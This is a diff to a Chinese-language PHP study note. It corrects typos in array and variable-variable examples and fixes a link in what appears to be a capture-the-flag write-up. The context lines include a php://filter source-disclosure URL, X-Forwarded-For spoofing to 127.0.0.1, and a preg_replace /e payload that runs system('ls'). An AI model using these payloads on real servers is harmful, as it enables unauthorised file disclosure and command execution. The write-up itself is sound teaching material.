@@ -88,7 +88,7 @@ echo "I like " . $cars[0] . " " . $cars[1] . ".";
 ```php
 $z = ['H','e','l', 'l', 'o'];
 $z[0] = 'H';
-$z[1] = 'r';
+$z[1] = 'e';
 $z[2] = 'l';
 $z[3] = 'l';
 $z[4] = 'o';
@@ -679,7 +679,7 @@ $a = "A";
 $$a = "B";
 echo $a . "<br>";
 echo $$a . "<br>";
-echo $Ice . "<br>";
+echo $A . "<br>";
 ```
 
 返回
@@ -1010,8 +1010,7 @@ http://111.200.241.244:57153/index.php?page=php://filter/read=convert.base64-enc
 ![img](./assets/76bb54-acc055-78805a221a988e79ef3f42d7-1024x513.png)
 
 设置 Header 头 **X-Forwarded-For** 将来源设置为 127.0.0.1，发现如果三个参数（pat、rep、sub）都设
-置了会进入一个正则表达式，这里可以利用 preg_replace 的安全问题，详见：[https://xz.aliyun.com/t/2
-577](https://xz.aliyun.com/t/2 577)
+置了会进入一个正则表达式，这里可以利用 preg_replace 的安全问题，详见：[https://xz.aliyun.com/t/2577](https://xz.aliyun.com/t/2577)
 
 ```
 ?pat=/1/e&rep=system('ls');&sub=1
